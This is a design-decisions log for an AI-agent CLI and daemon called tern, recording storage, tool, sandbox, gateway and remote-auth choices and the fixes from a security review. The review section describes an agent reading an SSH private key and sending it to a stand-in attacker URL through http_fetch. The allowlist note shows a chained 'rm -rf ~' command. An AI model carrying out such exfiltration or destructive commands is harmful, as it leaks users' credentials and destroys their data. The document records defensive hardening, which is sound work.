# Decisions

Choices made where the spec was ambiguous or silent. Newest at the bottom of each milestone.

## M0

- **Edition 2024, MSRV 1.88.** Built and tested on stable 1.99.1.
- **Lints live in `[workspace.lints]`** (`unsafe_code = "forbid"`, `clippy::unwrap_used`/`expect_used = "deny"`) instead of per-crate `#![forbid]` attributes; every crate opts in with `[lints] workspace = true`. This also covers the binary. `clippy.toml` allows unwrap/expect in tests; integration-test files add a file-level `allow` because their helpers aren't `#[test]` fns.
- **Hand-rolled migrations on `PRAGMA user_version`** rather than `rusqlite_migration`, to avoid coupling our rusqlite version to another crate's. Forward-only; a DB newer than the binary is refused. SQL lives in `crates/tern-store/migrations/NNNN_*.sql`.
- **Migration 1 adds indexes and FTS triggers** beyond the §14 DDL: `sessions(source, external_ref)`, `runs(session_id)`, `runs(status)`, `messages(session_id, id)`, `schedules(enabled, next_run_at)`, and insert/update/delete triggers for both external-content FTS5 tables.
- **`Store` is a cloneable `Arc<Mutex<rusqlite::Connection>>`** with synchronous methods. SQLite calls are short; revisit (connection pool or `spawn_blocking`) if contention shows up in the daemon.
- **Added `tern config init [--force]`** (not in §12.1). Creates the `~/.tern` layout, a commented `config.toml`, default `persona.md`/`user.md`, and the workspace directory. Never overwrites persona/user notes.
- **`tern doctor` is read-only.** It never creates `~/.tern` or the database. Missing setup is a warning (exit 0); broken things (unparseable config, loose `secrets.toml` permissions, missing secrets, failed integrity check, unreachable provider) are failures (exit 1). `--offline` skips network probes.
- **Provider reachability probe** is an authenticated `GET /v1/models` (Anthropic) or `GET {base_url}/models` (OpenAI-compatible) with a 5 s timeout.
- **`config.toml` uses `deny_unknown_fields`** so typos are reported by `doctor` instead of being silently ignored.
- **`tern config set`** edits with `toml_edit` to preserve comments, parses the value as a TOML literal (falling back to a string), and validates the whole file before an atomic rename.
- **File logging only once `~/.tern/logs` exists**; daily rotation, 14 files kept, filter via `TERN_LOG` (default `info`). No logs go to stderr.
- **Secrets file errors never echo values**: TOML parse errors report only the message, not the quoted source line.
- **E2E tests live in `crates/tern/tests/`** rather than a top-level `tests/` dir, because the workspace root isn't a package and `CARGO_BIN_EXE_tern` is only available to the binary crate's own tests.
- **Unimplemented commands** exist in the CLI with their final shape and exit with code 2 and the milestone they land in.
- **TLS: reqwest's default rustls (aws-lc-rs) with the platform verifier.** Open question for M1: on minimal Linux hosts without a CA bundle the platform verifier has no roots; we may want to bundle `webpki-roots` via a preconfigured rustls client so the static binary works anywhere.
- **Release profile**: `lto = true`, `codegen-units = 1`, `strip = true`, `panic = "abort"`.

## M1

- **Traits live in `tern-core`**: `Provider`, `Tool`, `ToolRegistry`, `ApprovalHandler`, plus the journal and agent loop. Implementation crates (`tern-providers`, `tern-tools`, `tern-sandbox`) depend on core, never the reverse. The registry is in core (not `tern-tools`, as §4 suggests) because the loop calls it.
- **`Tool::policy` takes `(ctx, args)`**, not `()`. `write_file`/`edit_file` need approval only outside the workspace, which depends on the path argument.
- **Journal API**: `step()` has the §5.2 signature. `step_with()` adds an `InFlight` policy (`Retry`, or `Substitute(output)` for non-idempotent tools) and returns `Outcome { value, replayed }`. Step bodies return `StepOutput { output, usage, messages }`; the messages are committed in the same transaction that completes the step. A `failed` row is re-executed on the next call.
- **Canonical hashing is explicit**: keys are sorted by our own serializer, so a dependency enabling `serde_json/preserve_order` can't silently change hashes.
- **Divergence also deletes messages** appended by the discarded steps (`messages.step_idx`, migration 2).
- **Runs freeze `model` and `system_prompt`** (migration 2). The prompt contains the current time, so rebuilding it on resume would diverge every LLM step. `runs.input_message_id` bounds which session messages a run sees, so a later run's messages don't leak into a replay.
- **LLM step input is a digest**: `{model, messages: n, request_digest}` where the digest is the hash of the full request. Any change is detected without storing the whole history again for every step.
- **Approval steps are always journaled when a tool requires approval**, even when the allowlist or `--yes` answers it. Otherwise "always allow" during the first attempt would remove the step on replay and shift every later index.
- **Allowlist patterns never match commands with shell metacharacters** (`; | & $ \` > < ( )` and newlines), so `git *` doesn't approve `git log; rm -rf ~`.
- **Retries happen inside the `llm` step** (up to 5 attempts; base 1 s doubling, capped at 30 s, jitter factor 0.5–1.0; `retry-after` honored). Only the final result is journaled. A stream that ends without a stop event counts as a retryable error.
- **Consecutive same-role messages are merged** when building requests, since each tool step appends its own `tool_result` message.
- **Path rules**: relative paths resolve in the workspace and may not escape it via `..` or symlinks. Absolute paths are allowed; writes to them need approval.
- **`max_tokens` defaults to 8192** per model call. Not yet configurable.
- **`tern run` output**: final answer on stdout; run/session ids and tool progress on stderr. Exit codes: 0 completed, 1 failed, 130 interrupted. Without `--yes`, approvals prompt on the terminal, or are denied when stdin isn't a TTY.
- **`tern resume` landed in M1** (cheap once the journal existed), with `--yes`. M2 adds daemon auto-resume and `runs show`.
- **IDs are UUIDv7** (hex, no dashes) for sessions and runs: time-ordered and collision-free without coordination.
- **Host shell kills only the direct child** on timeout/cancel. Grandchildren started in the background can outlive it. Killing the whole process group needs `unsafe` or another crate; revisit with the sandbox work in M6.
- **The mock provider picks its reply by the number of assistant turns** in the request, not by call count, so a resumed process continues the script where the crashed one stopped.
- **No real-provider run yet.** The M1 acceptance prompt runs against the mock in `tests/m1.rs`. The real-provider version is `#[ignore]`d and documented in the test.

## M2

- **Compaction summaries are messages, not deletions.** A summary is a user message with `messages.summary_of = N` (migration 3), appended by a `compaction` step. When building context, the latest summary goes first and every non-summary message with `id <= N` is dropped; full history stays in the database for `sessions show` and `session_search`. A later summary folds in the earlier one. `N` is the highest *non-summary* id being summarized; using the summary row's own id would drop kept messages that are older than the previous summary.
- **The compaction split never orphans a tool result**: the kept tail is moved back until it doesn't start with a `tool_result` message.
- **Token estimate** = chars/4 over system prompt, messages, and tool schemas, scaled by the ratio of provider-reported input tokens (including cache reads/writes) to our estimate for the previous request. The ratio comes from journaled usage, so replay makes the same compaction decisions.
- **Context window is configurable**: top-level `context_window` (default 128 000), overridable per provider. There is no per-model table yet.
- **Summarization uses the run's own model** with a fixed system prompt and no tools. Its text isn't streamed as assistant output.
- **`session_search` excludes the current session**, which is already in context and would otherwise match its own query.
- **FTS queries are built from words only**: each word quoted and OR-ed, so user text can't inject FTS5 syntax and BM25 ranks documents matching more terms higher.
- **Sessions get a title from their first message** (first 80 chars), set when the first run is created.
- **Startup recovery is `agent::triage_running_runs`**: runs still `running` that were updated in the last 24 h are returned for resumption; older ones are marked `interrupted`. The daemon (M5) will call it at startup; nothing calls it automatically yet.
- **Added `tern runs list`** (not in §12.1): `runs show` needs a run id, and there was no other way to find one.
- **Ctrl+C is registered before the run banner is printed**, using a unix signal listener that's active from creation, so an interrupt can't arrive before cancellation works.

## M3

- **The TUI talks to a `Backend` trait** (`tern-tui/src/lib.rs`), not to `Agent`/`Store` directly. The binary implements it over the embedded runtime (`tui_backend.rs`); M5 can add one over the daemon socket without touching the UI. Backend errors are plain `String`s, since the UI only displays them.
- **`App` is a plain state machine**: keys, agent events, approvals, and run completion go in; entries and `Effect`s (`Drive`, `Cancel`, `Quit`, `Resubscribe`) come out. The async loop in `term.rs` does all I/O. That's why most TUI behaviour is unit-tested with a fake backend and ratatui's `TestBackend`.
- **Approvals reach the UI through a channel**: `TuiApprover` sends the request plus a oneshot reply; the prompt renders inline at the bottom of the transcript and takes `y`/`a`/`n` (`Esc` = no). Ctrl+C or a finished run denies any pending prompt.
- **Ctrl+C**: cancels a running run (and denies a pending approval); when idle it clears the input. A second press within 1 s quits from any state. Quitting mid-run cancels and waits up to 3 s so the run is recorded as `interrupted`.
- **A new message while a run is in progress** cancels the run, then sends the message once it has stopped (spec §6). No "resume" hint is shown for the replaced run.
- **Newlines**: Shift+Enter (on terminals that report it; keyboard enhancement is requested when supported), Alt+Enter, and Ctrl+J. Bracketed paste keeps pasted newlines.
- **Tool calls collapse to one line** (icon, summary, first line of output). Ctrl+O toggles full output (up to 40 lines per tool) and compaction summaries for the whole transcript, rather than per-row toggles.
- **`/resume <id>` takes a session id or a run id.** A session id opens that conversation; a run id opens its session and resumes the run.
- **`/reload` rebuilds the whole runtime** (config, providers, tools) and re-subscribes to the new event bus. Refused while a run is in progress, like `/new` and `/resume`.
- **`/usage`** sums the journaled token usage of every step in the session. The status bar shows the last turn's tokens.
- **No markdown rendering yet**; assistant text is word-wrapped plain text.
- **Sessions are created lazily** on the first message, so opening and quitting the TUI leaves no empty session.
- **`tern` without a terminal** (stdin or stdout not a TTY) refuses and points to `tern run`.
- **`scripts/tui-smoke.py`** drives the real binary in a pty with the mock provider (chat, approval, `/usage`, double Ctrl+C, cancel and `/resume`), using a minimal VT100 screen model. It runs in CI after the unit tests. Standard library only, Unix only.

## M4

- **Tool sources.** `ToolRegistry` now combines fixed tools with `ToolSource`s (MCP servers, Luau connectors). A source's `prepare()` runs at the start of every run, before the first model call, and its tools are listed from then on. This is how MCP servers start lazily ("on first use") and how activated connectors appear without `/reload`. Built-in tools win name collisions.
- **`Tool::summary(args)`** lets a tool describe a call itself for UIs and approval prompts. `connector_activate` and `connector_test` use it to show the connector's capabilities. `runs show` still uses the generic summary, since it works from the journal without loading tools.
- **Skills** are read from `~/.tern/skills/*/SKILL.md` with a small `key: value` frontmatter parser (no YAML dependency; skills only need `name` and `description`). Skills are discovered again whenever a run starts, so new ones need no restart. `skill_read` returns the body plus a list of the skill's other files.
- **System prompt** gains `## Skills` (name: description) and `## Integrations` (one line per MCP server and connector). Servers that haven't started yet are listed without a status.

### Luau

- **mlua 0.12 with `luau`, `async`, `serialize`, `send`.** One VM per connector. Before `sandbox(true)`, `require` (mlua's default reads from disk), `loadstring`, `load`, `dofile`, `loadfile`, `getfenv` and `setfenv` are removed, and `print` is routed to the log (stdout belongs to the TUI). Luau has no `io` and only `os.time`/`os.clock`/`os.date`.
- **Time limit (5 s per call) is enforced twice:** a Luau interrupt checks a per-VM deadline, so CPU loops stop, and a tokio timeout around the call stops slow awaited HTTP. Loading a connector (its top-level code) is also time-limited. Memory is capped at 64 MB per VM with `set_memory_limit`. Calls into one VM are serialized.
- **`capabilities.http` entries** are exact hosts or `*.suffix` wildcards, compared case-insensitively; only `http`/`https` URLs are allowed. Response bodies are capped at 5 MB. `ctx.http` also has `put`, `patch` and `delete` shorthands beyond the spec's `get`/`post`. Responses include `ok` (2xx).
- **`ctx.kv` stores JSON values** under namespace `lua:<connector>`. Setting `nil` deletes.
- **Validation** covers the table's shape, identifiers (`[a-z][a-z0-9_]*`, max 32 chars), and a pragmatic JSON Schema subset: top-level `type: "object"`, `properties` holds schemas, and every `required` entry exists. An active connector's `name` must match its file name. Invalid files are skipped with an error that `tern connectors list` shows.
- **Connector tools default to `idempotent = false` and `requires_approval = false`**, overridable per tool.
- **Agent-authored connectors:** `connector_write` (draft and validate), `connector_test` (run a draft tool), and `connector_activate`, which the spec doesn't list but needed something to promote a draft. Activation always requires approval, and the prompt shows hosts, secrets and tools. Testing a draft requires approval too when it declares any HTTP host or secret: it is code the model just wrote.
- **Redaction now covers every value in `secrets.toml`**, plus env-provided secrets named by config or by an active connector.
- **`tern connectors test <name>`** loads and validates (active first, then draft) and prints the tools; it doesn't run any. `list` shows active connectors and drafts, their capabilities, and missing secrets.

### MCP

- **rmcp 3.8 client** (`client`, `transport-child-process`, `transport-streamable-http-client-reqwest`). It shares our reqwest 0.13, so there is no second HTTP stack.
- **stdio servers get a scrubbed environment** (PATH, HOME, locale and the like) plus only their declared `env_secrets`. A missing secret is a start error. Server stderr is piped into the log at debug level, never to the terminal.
- **Restart policy:** a failed start or a lost connection marks the server unavailable, with backoff of 1 s doubling to 60 s. The next call or run start reconnects after that. A call cut off by a disconnect returns an error saying it may or may not have taken effect; it is not retried.
- **Tool names** are `mcp__<server>__<tool>` cleaned to `[A-Za-z0-9_-]`; names over 64 characters (the strictest provider limit) are cut and given a stable FNV-1a suffix. Results join text content; images and audio become `[image content: <mime>]`; other blocks are JSON; `structuredContent` is used when there's no text.
- **Test fixture is a stdlib-only Python MCP server** (`crates/tern-mcp/tests/fixtures/mcp_server.py`, stdio and streamable HTTP) instead of the npm reference server. Tests then run offline with no package downloads, and they exercise rmcp against an implementation that isn't rmcp. CI runners already have `python3`.
- **Open question for M6:** Luau is C++ built by `cc`; the musl cross builds via `cargo-zigbuild` haven't been run yet with it in the tree.

## M5

- **MSRV raised to 1.89** for `std::fs::File::try_lock`, which holds the daemon's PID-file lock (no locking crate, no `unsafe`).
- **Our own cron evaluator** (`tern-core/src/cron.rs`) replaces the `cron` crate. That crate numbers weekdays from Sunday = 1 (so `1-5` means Sunday–Thursday) and requires a seconds field. Ours takes standard 5-field expressions with Vixie semantics (`0`/`7` = Sunday, names, ranges, steps, the day-of-month/day-of-week OR rule, `@daily` and friends) in local time, and skips times in DST gaps.
- **Each schedule gets its own session** (source `cron`), created by `schedule_create`, so scheduled runs don't fill the chat they came from. `deliver_to` defaults to "here" (the Telegram chat the request came from), or takes `none` or `telegram:<chat_id>`.
- **Scheduler**: ticks every 30 s (`TERN_SCHEDULER_TICK_MS` overrides it for tests). A due schedule's `next_run_at` advances *before* the run starts, so a crash can't start it twice. Missed slots collapse into one run, then continue from now.
- **Runs record where their answer goes** (`runs.deliver_to`, migration 4), so a run resumed after a crash still delivers. The daemon delivers completed and failed runs; interrupted ones were stopped on purpose.
- **Stopping the daemon doesn't cancel runs.** They stay `running` and resume on the next start through the same §5.3 triage as after a crash. Restarts (upgrades, reboots) then lose nothing.
- **One run per session**: a new message in a session cancels its run in progress (waiting up to 5 s), then starts the new one. Different sessions run concurrently.
- **Approvals are routed** by the run's `deliver_to` (Telegram buttons) or else to API clients over SSE. With no client attached, the answer is deny.
- **Telegram uses a small Bot API client on our reqwest** (`getUpdates` long polling, `sendMessage`, `editMessageText`, `answerCallbackQuery`, `sendChatAction`) instead of teloxide, which would add a second reqwest and TLS stack. Messages are plain text (no parse mode), so model output never needs escaping. Error messages never include the bot token, which is part of the URL.
- **Telegram update offset is persisted** (kv `telegram/update_offset`) as soon as updates arrive, so a restart never handles the same message twice. The crash-resume test caught this: without it a restarted daemon re-ran the chat message and interrupted the run it was resuming.
- **Streaming in Telegram**: one message per run, edited at most once a second. It shows the tail (with `▌`) while longer than 4096 characters, plus a `▸ tool` line per tool call; the final answer replaces it and is split at 4096 on line breaks. Approvals are a message with `Allow once` / `Always (<pattern>)` / `Deny` buttons; after answering it is edited to show the decision, with the buttons removed.
- **Pairing**: `tern gateway pair` prints an 8-character code (no 0/O/1/I) valid for 10 minutes and single use. The user sends it (or `/start CODE`) to the bot. Unpaired users get a short "this bot is private" reply and nothing else.
- **Socket API** is axum over a Unix socket (mode 0600), documented at the top of `daemon/api.rs`. `/v1/events` is SSE carrying agent events plus `approval_requested`. Attaching TUIs use reqwest's `unix_socket`. `/reload` isn't supported while attached (restart the daemon).
- **Long data directories**: Unix socket paths max out around 104 bytes (macOS). If `~/.tern/tern.sock` is longer, the daemon binds in `/tmp/tern-<uid>/` (created 0700; ownership and mode checked) and makes `tern.sock` a symlink there; clients follow it. Found when the daemon failed to start from a deep scratch directory.
- **`tern` attaches to a running daemon** when its socket answers `/v1/health`, otherwise it runs embedded. The pty smoke test checks attach really happened: daemon sessions have source `api`.
- **Test doubles**: `crates/tern/tests/fixtures/fake_telegram.py` is a stdlib Bot API fake with control endpoints (inject messages and button taps, read what the bot sent) that drops acknowledged updates like Telegram does. The mock provider gained `conversations` (scripts chosen by the first user message), so the chat and the scheduled run can be scripted separately.
- **Measured**: idle daemon RSS 15.9 MB (target < 30 MB); release binary 14 MB (target < 25 MB).

## M6

- **Two optimized profiles.** `release` uses thin LTO and 16 codegen units, so local builds use every core: about 33 s to rebuild the binary crate on an M4 Max, 17 MB. `dist` (inherits `release`) uses fat LTO and one codegen unit: about 85 s, single-threaded at the end, 14 MB. CI artifacts and releases use `dist`.
- **Docker backend shells out to the `docker` CLI**; no Docker API client. One long-lived container per workspace, named after a stable hash of the workspace path and labelled `tern.sandbox=1`:
  - It runs `--init`, mounts the workspace at `/workspace`, runs as the workspace owner's uid:gid, and sleeps until commands are exec'd into it.
  - A changed image replaces the container.
  - Each exec records its shell's pid inside the container. On timeout or cancel, that pid is killed with a second `docker exec`, because killing the host-side `docker exec` would leave the command running.
  - The container has default (bridge) networking; there's no network policy yet.
  - Tests use a fake `docker` script; a real-daemon test runs in CI on Linux.
- **Linux TLS roots**: every HTTP client comes from `tern_core::net::http_client()`. On Linux it merges Mozilla's roots (`webpki-root-certs`) into the platform verifier. Without that, a static binary on a system with no CA bundle fails *every* HTTPS request: `rustls-platform-verifier` errors when no system roots load. System roots still work (corporate CAs). rmcp's HTTP transport is given this client instead of its own.
- **Cross-builds verified locally** with `cargo-zigbuild` and Zig 0.17: both musl targets link statically with Luau's C++. Release assets are `tern-<target>.tar.gz` plus `.sha256`, without the version, so `releases/latest/download/` works for `install.sh`.
- **`install.sh`** verifies SHA-256 and installs to `~/.local/bin` without sudo. It refuses to run until `TERN_REPO` (or a mirror via `TERN_DOWNLOAD_URL`) is set, because this repository has no published home yet.

### Security review fixes

An independent review of the trust boundaries found these; all are fixed with tests unless noted.

- **Silent exfiltration**: `read_file ~/.ssh/id_ed25519` followed by `http_fetch https://attacker/?d=…` needed no approval. Now reads outside the workspace need approval (like writes). File tools can never write anywhere in `~/.tern` or read `secrets.toml` or the database. `http_fetch` refuses non-public addresses (loopback, RFC 1918, link-local and metadata, CGNAT, ULA, IPv4-mapped forms). It resolves DNS itself and pins the connection to the checked addresses, and follows redirects by hand, checking each hop.
- **Connector approval vs. what runs**: capabilities came from running the file, so a draft could declare `os.time()`-dependent hosts, or be edited after approval.
  - Now `connector_test` and `connector_activate` record the source hash and capabilities their policy and summary saw. `call()` runs only if a fresh load matches.
  - Activation writes exactly the approved bytes and stores `{hash, capabilities}` (kv `lua:approved`). An activated connector whose file or capabilities later differ isn't loaded.
  - Hand-installed connectors (no record) load as before.
- **Luau redirects** followed reqwest's default policy to any host, carrying custom headers like `X-Api-Key`. Each connector now has its own client whose redirect policy enforces the same allowlist.
- **Dangling symlinks**: `write_file x` where `x` is a dangling symlink looked like a new file in the workspace but would create the link's target anywhere. Path resolution now refuses dangling symlinks.
- **Redaction gaps**: the redaction list was fixed at startup, so env-only secrets first read later were stored unredacted, and connector `ctx.log`/`print` and MCP stderr weren't redacted. `Secrets::get` now records every value it hands out in a set shared by all clones. The journal and those log paths redact against it, plus everything in `secrets.toml`.
- **"Always" too broad**: approvals now carry `pattern: Option<String>`. Tools can opt out with `Tool::allow_always() -> false`; the connector tools do, and old `*` allowlist entries no longer cover them. Shell commands that run other commands (shells, `env`, `sudo`, `xargs`, `find`, interpreters, `ssh`, `docker`, …) are never offered "always". Every front end hides the option when there's no pattern.
- **Telegram approvals** could be answered by any paired user from any chat. A tap now counts only in the chat the request was sent to.
- **Pairing codes** now come from the OS CSPRNG (UUIDv4 bytes, 32-symbol alphabet, unbiased) instead of `fastrand`.
- **Socket fallback hijack**: a stale `tern.sock` symlink into `/tmp` could point clients at a socket another local user planted.
  - The fallback now prefers per-user `$XDG_RUNTIME_DIR` or macOS's per-user `$TMPDIR`, then `/tmp/tern-<uid>`.
  - The uid is the process's real one (owner of a probe file) rather than `$HOME`'s owner.
  - Clients only follow the link if the target socket and its directory are owned by them and the directory is mode 0700; otherwise they don't attach.
- **Not reproduced**: the review suspected Luau's C pattern matcher could run past the time limit (catastrophic backtracking). A test shows Luau's interrupt fires inside it too, and the call stops at the limit; the test stays as a regression check.

### Post-v1 fixes

- **`panic = "abort"` removed from the release profiles.** Luau raises Lua errors as C++ exceptions that unwind through mlua's Rust frames. Under `abort` any connector error, even an ordinary `error("…")` or a missing secret, terminated the process with `libc++abi: terminating due to uncaught exception of type lua_exception`. No test caught it because cargo builds test binaries with `panic = "unwind"` whatever the profile says. The end-to-end tests now accept `TERN_TEST_BIN`, and CI runs them against the `--profile dist` binary. Unwind tables cost about 2 MB (dist: 16 MB).
- **Secrets guidance for the model**: the system prompt and `connector_write` docs say secrets come from the environment or `~/.tern/secrets.toml`, take effect after a restart or `/reload`, and are never read from `.env` files or pasted into chat. A missing `ctx.secret` says how to add it. (A model had told a user to put an API key in `~/.tern/.env`.)
- **`capabilities.http` entries are validated**: a host name, `*.suffix`, an IP, or `localhost`. A bare `"*"` (which a model wrote, meaning "anything") matched nothing; it, schemes, ports and paths are now rejected with an explanation.
- **Diagnostics** (added after a crash left no trace):
  - **Unbuffered logs.** File logging is synchronous; the non-blocking writer lost the lines before the abort.
  - **Crash files.** A panic hook writes `logs/crash-<time>.txt` (message, location, thread, backtrace, version, OS) and prints its path. ratatui's hook wraps it, so the terminal is restored first.
  - **Native aborts** (like the Luau one) can't be hooked without `unsafe` signal handling; the unbuffered log is what survives them.
  - **Log lines** record run start and finish (with redacted errors) and each tool call's outcome; a failure includes the first line of its output, redacted.
  - **Test switch.** `TERN_TEST_PANIC` makes tern panic at startup, to test the hook.
- **`tern report`** (not in §12.1) writes one Markdown file: environment, `tern doctor --offline`, `config.toml`, `tern connectors list`, the newest unfinished run's journal (or `--run`), up to two crash files, and the last 200 log lines.
  - It runs those commands as subprocesses of the same binary, so the output matches what the user sees.
  - **Redaction**: every value in `secrets.toml`, plus env secrets named by config or connectors, then patterns for well-known token formats (`sk-`, `sk-ant-`, `ghp_`, `github_pat_`, `xox*-`, `glpat-`, AWS keys, Telegram bot tokens), `key=`/`token:`/`password=`-style values, and `Bearer`/`Basic` credentials.
  - Saved with mode 0600, and the user is told to review it before sharing.

## D1

Remote core, from `docs/deployment-spec.md` §6–§7.

- **Auth is one axum middleware on the TCP listeners** (`daemon/auth.rs`), in front of the same router the socket serves, so no handler changed. The Unix socket gets no layer and stays the owner. A caller is an optional `Auth` request extension: absent means the local owner.
- **Scopes are decided by method and path, deny by default.** `/v1/devices`, `/v1/config` and `/v1/secrets` are owner-only for every method. Other GETs need `read`. Writes need `chat` only under an allowlisted prefix (`/v1/runs`, `/v1/sessions`, `/v1/approvals`, `/v1/schedules`, `/v1/memories`, `/v1/uploads`, `/v1/models/check`); any other write needs `owner`. A new endpoint is therefore owner-only until someone lists it. Prefixes match whole path segments.
- **TLS without hyper-util or axum-server**: a small `Listener` (axum 0.8's trait) fed by an accept loop that runs each `tokio-rustls` handshake in its own task with a 10 s timeout, so one slow client can't stall accepts. HTTP/1.1 only (ALPN `http/1.1`), matching the axum features already in use. The client address reaches the middleware as `ConnectInfo<Peer>`.
- **`tls = "auto"`** generates an ECDSA P-256 certificate with `rcgen` on first use (SANs: `localhost`, `127.0.0.1`, `::1`, the host name) in `$TERN_HOME/tls/`, written 0600 via rename. Both the daemon and `tern devices pair` create it if missing, so a pairing link can be made before the daemon first starts. It never expires (rcgen's default validity), since clients pin it rather than trust a chain. Rotating it means deleting the directory and re-pairing.
- **`tls = "off"` is refused** unless every TCP listener is loopback and `trust_proxy = true`. The check runs before the daemon resumes any runs, and `tern doctor` runs it too.
- **Crypto is aws-lc-rs**, which reqwest's rustls already pulls in: SHA-256 fingerprints and the token CSPRNG (`aws_lc_rs::rand`) need no new crates. New dependencies: `tokio-rustls`, `rustls` (direct, for the pinned client verifier), `rcgen` (aws-lc-rs backend, no `ring`) and `qrcode` (no default features; terminal rendering only). axum gained its `multipart` feature (multer).
- **Device pairing codes live in their own table** (`device_pairing_codes`, migration 5) rather than sharing Telegram's `pairing_codes`, so a Telegram code can't pair a device and the reverse. The code carries the scope and an optional name chosen by the owner, and is consumed with `DELETE … RETURNING` so two redemptions can't both win. Same alphabet, length and 10-minute TTL as Telegram codes (`gateway_cmd::new_code`).
- **Tokens** are `tern_dev_` + 43 base62 characters (256 bits, rejection-sampled so every symbol is equally likely). Only their blake3 hash is stored. The middleware looks the hash up on every request (one indexed SQLite read), so revocation needs no cache invalidation. `last_seen_at`/`last_ip` are written at most once a minute per device.
- **Revocation closes event streams** by wrapping `text/event-stream` responses for device callers in `take_until(token)`, with one cancellation token per device in a process-wide map. `tern devices revoke` goes through the daemon's socket when it's running (so streams close at once) and falls back to the database otherwise.
- **401 vs 403**: an unknown or revoked token is 401 with `WWW-Authenticate: Bearer` and an error saying the device was signed out. A valid token with too little scope is 403. Clients treat 401 as "signed out" and don't retry; a bad pairing code is also 401 but on the pairing route, which clients don't map to signed out.
- **Hardening as specified**: pairing is limited to 5 attempts per minute per client IP (sliding window, in memory), and TCP request bodies are capped at 1 MB except `/v1/uploads` (25 MB plus multipart framing; a route-level `DefaultBodyLimit` overrides the router's). There are no CORS headers. `audit`-target log lines record pairing, failed codes, rate-limit hits, revocations, and owner-scope writes from devices. With `trust_proxy`, `X-Forwarded-For` is honoured only when the peer is loopback.
- **`/v1/health` capabilities**: `api` (1), `deployment` (`local` on the socket, `server` over TCP; `cloud` is for D5), `store` (`sqlite`), `library` (`fs`), `auth {kind, scope}` and `features` (`devices`, `schedules`, `uploads`). `pid` and `version` stay for older clients. Deployment is chosen per connection, not per core, because what the GUI needs to know is whether *it* can reach the files. `GET /healthz` answers `ok` without auth.
- **Pairing links** are `tern://pair?u=…&c=…&fp=sha256:<HEX>&n=<host>` with the URL percent-encoded. `fp` appears only for `tls = "auto"`. The URL is `api.public_url` (new key), else `tern devices pair --url`, else the first TCP listener, with the host name substituted for `0.0.0.0`. The owner can also make a code over the API (`POST /v1/devices/pair`), for the desktop app's Add device.
- **`tern devices`**: `pair [--scope chat|owner|read] [--name] [--url]` prints a QR code when stdout is a terminal, then the link; `list`, `revoke`, `rename`; and `join <link>`, which redeems a link from this machine (pinned) and prints the token. `chat` is the default scope, as the spec recommends for phones.
- **`tern --remote <url> [--pin sha256:…]`** attaches the TUI to a remote core. The token comes only from `$TERN_REMOTE_TOKEN`, so it doesn't appear in `ps`. `remote.rs` gained a base URL and default headers; nothing in the TUI changed. Errors include the cause chain, because reqwest's message hides TLS failures such as a pin mismatch.
- **Uploads** go to `<workspace>/uploads/<uuid v7>/<name>` and return the workspace-relative path. The name is reduced to its last path component with control characters and leading dots removed. A failed upload deletes its partial file.
- **Dart client: the sealed `Endpoint` is the transport** rather than the spec's `TernTransport` interface. It already gave each transport its `HttpClient`, base URL and headers, and the desktop app constructs it with `Endpoint.local()`. `TcpEndpoint` became `RemoteEndpoint(base, token:, pin:)`. With a pin, the `HttpClient` gets `SecurityContext(withTrustedRoots: false)` and a `badCertificateCallback` that compares SHA-256 of the DER (constant-time), so the pinned certificate is the only thing trusted. `package:crypto` is the one new dependency, for SHA-256. 401 from a remote core is `SignedOutException` (from requests and from `events()`); there's no retry anywhere in the client. Added `TernClient.pair`, `PairingLink.parse`, `upload`, `devices`, `offerPairing`, `revokeDevice`, and capability fields on `Health` (defaults match an older local daemon). Tests run against an HTTPS server with a self-signed fixture in `test/fixtures/` (made with openssl, 100-year validity), and the live test pairs with a real daemon over TLS.
- **Not in D1**: event replay (`Last-Event-ID`) and the approval wait for push devices are D0 and D4. The GUI's remote profiles and Keychain storage are in the Flutter app, which this phase didn't touch (another session owned `apps/desktop/lib/`). `tern run --remote` isn't supported; only the chat UI attaches remotely.

## S0–S1

Sub-agents, from `docs/subagents-design.md` §7 (S0: child runs; S1: spawn and wait). Off by default (`[subagents] enabled = false`) until the prompt work in S5.

- **Who drives children.** `Subagents` (`crates/tern/src/subagents.rs`) lives in `Runtime` (`runtime.subagents`, set only when enabled) and implements core's `SubagentHost`. It drives children through a `RunDriver`: `LocalDriver` (tokio tasks, used by `tern run` and the embedded TUI) by default, swapped for `daemon::manager::ManagerDriver` in the daemon, so children are ordinary daemon runs in `/v1/runs/active` and obey cancel. Tools and the agent reach the host through a `HostSlot` (a shared `OnceLock`) filled after both are built. Back-references are `Weak` (driver → agent/manager, host → tool registry), so `/reload` doesn't leak runtimes. `Runtime.agent` became `Arc<Agent>`.
- **No double driving.** `Manager::spawn` and `LocalDriver::drive` refuse a run that is already being driven (`spawn` now returns `bool`). At daemon start, triage resumes children like any run, and a parent that reaches its wait first starts them itself (`ensure_driven`); whichever comes second is a no-op.
- **The call id and mail consumption reach tools through a task-local**, like `progress_sink`: the loop runs each call inside `tool::with_call(id, …)`; tools read `current_call_id()` and call `consume_mail(ids)`, and the ids are consumed in the tool step's completing transaction (`StepOutput::consumes` → `Store::complete_step_consuming`). Adding the id to `ToolCtx` would have touched 15 constructors across crates.
- **"Done" means the child's `finished:<id>` mail exists**, not its run status: the host writes the status first and the mail second, and every wait reads the mail, so a report is never half-visible. `agent_wait` consumes the mail it reports; the default set is every child whose report hasn't been consumed. A crash between the two writes is repaired by `Subagents::reconcile` in `Runtime::open`.
- **The inbox step's input is `{"wait": bool}`** (decided by where in the loop it is, so replay hashes the same); the delivered mail ids are in its output (`InboxOutput`). Before each model call and at the end of a turn, the loop asks `Journal::peek(idx)`: a recorded step decides (replay never reads the mailbox), otherwise the host. An end-of-turn inbox that delivers nothing ends the run. `Store::truncate_steps` puts mail consumed by discarded steps back in the inbox.
- **Queued children have run status `queued`** (no new `RunStatus` variant: the loop never sees it). `Agent::resume` starts them. `set_run_status` doesn't set `finished_at` for `queued`; `/v1/runs/{id}/wait` treats it as in progress.
- **Limits are checked where `max_iterations` always was**, after the turn's tool calls, so a stopped run never ends on unanswered `tool_use` blocks. The token budget counts the run's own journaled model usage (`llm` steps: input + output + cache). A parent's budget doesn't include its children's usage, as §1.6 suggests: that usage isn't in the parent's journal, so counting it wouldn't replay the same. Both notes start with `[stopped: ` (`agent::STOPPED_MARKER`), which is how the parent sees `stopped` rather than `completed`; a report rebuilt from the store at startup can't tell and says `completed`.
- **A child's system prompt is its parent's frozen prompt** until S5 adds the sub-agent role section; its model is the requested alias / `provider:model`, else `[subagents].default_model`, else the parent's.
